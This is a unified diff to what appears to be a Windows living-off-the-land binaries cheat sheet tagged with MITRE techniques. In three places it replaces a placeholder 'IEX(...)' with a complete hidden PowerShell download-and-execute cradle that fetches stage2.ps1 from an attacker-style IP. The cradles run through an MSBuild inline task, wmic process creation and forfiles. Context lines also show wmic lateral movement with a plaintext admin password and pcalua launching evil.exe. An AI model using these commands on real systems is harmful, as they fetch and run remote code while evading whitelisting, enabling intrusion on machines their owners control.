@@ -108,7 +108,7 @@ MSBuild.exe @payload.rsp
 #     <Task><Code Type="Class" Language="cs"><![CDATA[
 #       public class ClassEx : Microsoft.Build.Utilities.Task {
 #         public override bool Execute() {
-#           System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX(...)");
+#           System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')");
 #           return true; } }
 #     ]]></Code></Task></UsingTask></Project>
 # MITRE: T1127.001 | Privilege: User
@@ -180,7 +180,7 @@ Windows Management Instrumentation CLI. Executes processes locally and remotely.
 
 ```
 # Local process creation:
-wmic.exe process call create "powershell.exe -nop -w hidden -c IEX(...)"
+wmic.exe process call create "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"
 
 # Remote process creation (lateral movement):
 wmic.exe /node:"192.168.1.10" /user:CORP\admin /password:Password123! process call create "cmd.exe /c whoami > C:\out.txt"
@@ -279,7 +279,7 @@ ssh.exe localhost "whoami /all"
 ssh.exe -o ProxyCommand="calc.exe" .
 
 # forfiles.exe — execute per matched file (common execution proxy):
-forfiles /p C:\Windows\System32 /m notepad.exe /c "powershell -nop -c IEX(...)"
+forfiles /p C:\Windows\System32 /m notepad.exe /c "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"
 
 # pcalua.exe — Program Compatibility Assistant:
 pcalua.exe -a C:\temp\evil.exe
